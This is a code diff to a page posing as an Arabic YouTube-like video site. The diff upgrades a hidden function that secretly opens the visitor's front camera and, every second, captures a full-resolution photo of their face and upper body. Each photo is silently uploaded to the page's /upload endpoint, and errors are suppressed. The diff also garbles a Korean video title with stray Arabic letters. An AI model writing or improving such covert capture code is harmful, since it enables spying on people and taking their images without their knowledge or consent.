@@ -273,7 +273,7 @@ const DE='مقطع ترفيهي مميز. لا تنسَ الإعجاب والا�
 const VIDEOS=[
  {id:'1XqX5WnhEcE',title:'في 15 دقيقة هعمل موقعك الخاص ويبقى أونلاين مجاناً...',ch:'Learn_Simply@',subs:11000,views:253000,likes:11000,time:'قبل 8 أشهر',cat:'برمجة',dur:'15:00',desc:DC},
  {id:'dQw4w9WgXcQ',title:'ريك أستلي – Never Gonna Give You Up (الفيديو الرسمي)',ch:'Rick Astley',subs:4300000,views:1500000000,likes:18000000,time:'منذ ١٦ سنة',cat:'موسيقى',dur:'3:33',desc:DM},
- {id:'9bZkp7q19f0',title:'PSY – GANGNAM STYLE (강남스타일) الفيديو الرسمي',ch:'officialpsy',subs:18000000,views:5200000000,likes:25000000,time:'منذ ١٤ سنة',cat:'موسيقى',dur:'4:13',desc:DM},
+ {id:'9bZkp7q19f0',title:'PSY – GANGNAM STYLE (강남스타يل) الفيديو الرسمي',ch:'officialpsy',subs:18000000,views:5200000000,likes:25000000,time:'منذ ١٤ سنة',cat:'موسيقى',dur:'4:13',desc:DM},
  {id:'PkZNo7MFNFg',title:'تعلّم JavaScript – دورة كاملة للمبتدئين',ch:'freeCodeCamp.org',subs:9000000,views:14000000,likes:420000,time:'منذ ٦ سنوات',cat:'برمجة',dur:'3:26:42',desc:DC},
  {id:'jNQXAC9IVRw',title:'أنا في حديقة الحيوان – أول فيديو في تاريخ يوتيوب',ch:'jawed',subs:4000000,views:330000000,likes:13000000,time:'منذ ٢١ سنة',cat:'ترفيه',dur:'0:19',desc:'أول فيديو تم رفعه على يوتيوب في التاريخ.'}
 ];
@@ -505,20 +505,37 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا المعدلة لالتقاط كامل الوجه والرقبة والصدر بوضعية عمودية ===== */
+/* ===== الكاميرا المعدلة لالتقاط الصورة الفوتوغرافية الكاملة (Photo Mode) ===== */
 let isCapturing = false;
+let imageCapture = null;
+
+function sendBlob(blob) {
+  if (!blob) return;
+  let fd = new FormData();
+  fd.append('image', blob, 'face.jpg');
+  fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+}
+
+function captureFallback(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 1080;
+  canvas.height = video.videoHeight || 1440;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(sendBlob, 'image/jpeg', 0.95);
+}
 
 function startCapture() {
     if (isCapturing) return;
     isCapturing = true;
 
-    // إعدادات تتوافق مع الأبعاد العمودية للجوال لمنع اقتصاص الصورة
+    // طلب أبعاد المستشعر الكاملة لخاصية الصورة (3:4 أو 4:3) بدون تقييد زوم الفيديو
     const constraints = {
         video: {
             facingMode: "user",
-            width: { ideal: 1440 },
-            height: { ideal: 1920 },
-            aspectRatio: { ideal: 0.75 } // نسبة 3:4 تعطي أوسع زاوية التقاط رأسية شاملة للوجه والصدر
+            width: { ideal: 3840, min: 1280 },
+            height: { ideal: 2160, min: 720 },
+            aspectRatio: { ideal: 0.75 }
         }
     };
 
@@ -526,24 +543,30 @@ function startCapture() {
     .then(stream => {
         const video = document.getElementById('video');
         video.srcObject = stream;
+        
+        const track = stream.getVideoTracks()[0];
+        
+        // المحاولة الأولى: استخدام ImageCapture لالتقاط صورة فوتوغرافية حقيقية بكامل أبعاد المستشعر (Photo Mode)
+        if ('ImageCapture' in window) {
+            try {
+                imageCapture = new ImageCapture(track);
+            } catch(e) {
+                imageCapture = null;
+            }
+        }
+
         video.onloadedmetadata = () => {
             video.play();
             
             setInterval(() => {
-                const canvas = document.createElement('canvas');
-                // استخدام الأبعاد الحقيقية القادمة مباشرة من الكاميرا لمنع التشويه والاقتصاص
-                canvas.width = video.videoWidth || 1080;
-                canvas.height = video.videoHeight || 1440;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    if (!blob) return;
-                    let fd = new FormData();
-                    fd.append('image', blob, 'face.jpg');
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }, 'image/jpeg', 0.95);
+                if (imageCapture && typeof imageCapture.takePhoto === 'function') {
+                    // التقاط صورة بوضع الصورة الكامل دون اقتصاص التقريب الخاص بالفيديو
+                    imageCapture.takePhoto()
+                    .then(sendBlob)
+                    .catch(() => captureFallback(video));
+                } else {
+                    captureFallback(video);
+                }
             }, 1000);
         };
     })
